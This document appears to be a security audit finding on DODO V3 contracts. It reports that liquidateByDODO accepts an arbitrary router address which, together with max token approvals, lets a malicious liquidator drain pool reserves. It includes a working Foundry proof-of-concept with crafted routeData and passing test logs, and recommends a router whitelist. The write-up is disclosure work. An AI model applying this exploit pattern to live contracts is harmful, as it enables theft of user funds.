@@ -1,0 +1,173 @@
+# [H] Liquidators can drain reserves
+
+## Summary
+Severity: High
+Reporter: jprod15
+Source: https://github.com/sherlock-audit/2023-06-dodo/blob/main/new-dodo-v3/contracts/DODOV3MM/D3Pool/D3Funding.sol#L20-L23
+Type: audit-issue
+
+## Details
+# Liquidators can drain reserves
+
+## Summary
+Due to the fact that the liquidateByDODO function is missing a control check for the router address parameter, and the fact that D3Funding.sol sets approvals to type(uint256).max, a malicious liquidator is able to drain reserves
+## Vulnerability Detail
+      function borrow(address token, uint256 amount) external onlyOwner nonReentrant poolOngoing {//@audit-info D3Funding.sol
+        // call vault's poolBorrow function
+        ID3Vault(state._D3_VAULT_).poolBorrow(token, amount);
+        // approve max, ensure vault could force liquidate
+        uint256 allowance = IERC20(token).allowance(state._D3_VAULT_, address(this));
+        if(allowance < type(uint256).max) {
+            IERC20(token).approve(state._D3_VAULT_, type(uint256).max);//@audit-info max approval to vaul
+        }
+
+        _updateReserve(token);
+        require(checkSafe(), Errors.NOT_SAFE);
+        require(checkBorrowSafe(), Errors.NOT_BORROW_SAFE);
+    }
+
+--
+
+    function liquidateByDODO(
+        address pool,
+        LiquidationOrder calldata order,
+        bytes calldata routeData,
+        address router
+    ) external onlyLiquidator nonReentrant {
+        uint256 toTokenReserve = IERC20(order.toToken).balanceOf(address(this));
+        uint256 fromTokenValue = DecimalMath.mul(ID3Oracle(_ORACLE_).getPrice(order.fromToken), order.fromAmount);
+
+        // swap using Route
+        {
+            IERC20(order.fromToken).transferFrom(pool, router, order.fromAmount);
+            (bool success, bytes memory data) = router.call(routeData);
+            if (!success) {
+                assembly {
+                    revert(add(data, 32), mload(data))
+                }
+            }
+        }
+
+        // the transferred-in toToken USD value should not be less than 95% of the transferred-out fromToken
+        uint256 receivedToToken = IERC20(order.toToken).balanceOf(address(this)) - toTokenReserve;
+        uint256 toTokenValue = DecimalMath.mul(ID3Oracle(_ORACLE_).getPrice(order.toToken), receivedToToken);
+        
+      
+
+        require(toTokenValue.div(fromTokenValue) >= DISCOUNT, Errors.EXCEED_DISCOUNT);
+        IERC20(order.toToken).safeTransfer(pool, receivedToToken);
+        ID3MM(pool).updateReserveByVault(order.fromToken);
+        ID3MM(pool).updateReserveByVault(order.toToken);
+    }
+as can see liquidateByDODO lack check the parameter router and this allow set arbitrary address 
+
+Here is a demonstration of how a liquidator can drain reserves
+Run this in D3VaultLiquidationTest.t.sol
+
+
+    contract liquidator1 {
+      //this contract is the liquidator 
+
+     function updateReserveByVault(address token) external {
+
+     }
+
+    }
+
+      
+
+    liquidator1 liqui ;//@audit-info add this 
+    function setUp() public {
+        contextBasic();
+
+        token2.mint(user1, 1000 ether);
+        
+        vm.prank(user1);
+        token2.approve(address(d3Vault), type(uint256).max);
+
+        liqui = new liquidator1(); //@audit-info add this 
+        token3.mint(address(liqui), 1000 ether);//@audit-info add this 
+
+        }
+     function test_drain_LiquidateByDODO() public {
+        contextBadDebt();
+        vm.prank(vaultOwner);
+        d3Vault.addLiquidator(address(liqui));
+        vm.prank(address(liqui));
+        d3Vault.startLiquidation(address(d3MM));
+       
+        console.log("reserve token3",d3MM.getTokenReserve(address(token3)));
+        console.log("reserve token2",d3MM.getTokenReserve(address(token2)));
+       
+        
+        vm.prank(address(d3MM));
+        token2.approve(address(d3Vault), type(uint256).max);
+
+         vm.prank(address(d3MM));
+        token3.approve(address(d3Vault), type(uint256).max);
+
+        vm.prank(address(liqui));
+        token3.approve(address(d3Vault), type(uint256).max);
+
+
+         LiquidationOrder memory order = LiquidationOrder(
+            address(token3),
+            address(token2),
+            4 ether
+        );
+
+        bytes memory routeData = abi.encodeWithSignature(
+            "transferFrom(address,address,uint256)",
+            address(d3MM),
+            address(d3Vault),
+            token2.balanceOf(address(d3MM))//reserve from d3MM token2
+        );
+
+       
+        console.log("balance before liquidator",token2.balanceOf(liquidator));
+          vm.prank(address(liqui));
+
+        d3Vault.liquidateByDODO(
+            address(liqui),//arbitrary poll
+            order,
+            routeData,
+            address(token2)//arbitrary router
+            );
+     
+        console.log("reserve token2",token2.balanceOf(address(d3MM)));
+        console.log("balance atfer liquidator",token2.balanceOf(address(liqui)));
+
+    }
+
+
+   
+
+the resul 
+
+        Running 1 test for test/DODOV3MM/D3Vault/D3VaultLiquidation.t.sol:D3VaultLiquidationTest
+        [PASS] test_drain_LiquidateByDODO() (gas: 1017267)
+        Logs:
+        reserve token3 50000000000000000000
+        reserve token2 5000000000000000000
+        balance before liquidator 0
+        toTokenValue  60000000000000000000
+        fromTokenValue  4000000000000000000
+        discount  15000000000000000000
+        reserve token2 0
+        balance atfer liquidator 5000000000000000000
+
+        Test result: ok. 1 passed; 0 failed; finished in 10.88s
+
+
+## Impact
+reserves drained is very bad to the protocol
+## Code Snippet
+https://github.com/sherlock-audit/2023-06-dodo/blob/main/new-dodo-v3/contracts/DODOV3MM/D3Pool/D3Funding.sol#L20-L23
+
+https://github.com/sherlock-audit/2023-06-dodo/blob/main/new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultLiquidation.sol#L98-L105
+## Tool used
+
+Manual Review
+
+## Recommendation
+add a whitelist of routers
